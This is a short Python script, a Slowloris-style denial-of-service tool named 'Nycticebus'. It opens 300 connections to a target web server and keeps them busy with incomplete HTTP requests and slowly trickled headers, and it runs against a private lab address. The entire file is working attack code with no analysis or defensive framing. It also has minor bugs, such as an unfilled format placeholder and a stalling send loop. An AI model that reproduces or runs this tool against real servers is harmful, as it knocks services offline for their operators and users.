

import socket, random, time, sys

class Nycticebus:

    def __init__(self, target_ip, target_port):
        self.__target_ip = target_ip
        self.__target_port = target_port

    def attack(self):
        """attack the target using incomplete GET requests"""
        sockets = self.__createSockets()

        while True:
            try:
                for s in sockets:
                    try:
                        s.send("GET /?{} HTTP/1.1\r\n".encode("utf-8")) #.format(random.randint(0, 2000)).encode("utf-8")
                        s.send("User-agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0\r\n".encode("utf-8"))
                        s.send("Content-Length: 1000000\r\n".encode("utf-8"))
                        s.send("Connection:close\r\n".encode("utf-8"))
                        s.send("X-a:\r\n".encode("utf-8"))
                    except socket.error:
                        pass #log errors here
                
                    for i in range(100000000):
                        s.send("X-a:b\r\n".encode("utf-8"))
                        time.sleep(2)
            except(KeyboardInterrupt, SystemExit):
                break

    def __createSockets(self):
        """returns a list() of sockets"""
        socket_count = 300
        sockets = []
        for i in range(socket_count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.__target_ip, self.__target_port))
                        
            except socket.error:
                pass #log errors here

            sockets.append(s)
        
        return sockets


sl = Nycticebus("192.168.56.101", 80)
print("Starting the attack...")
sl.attack()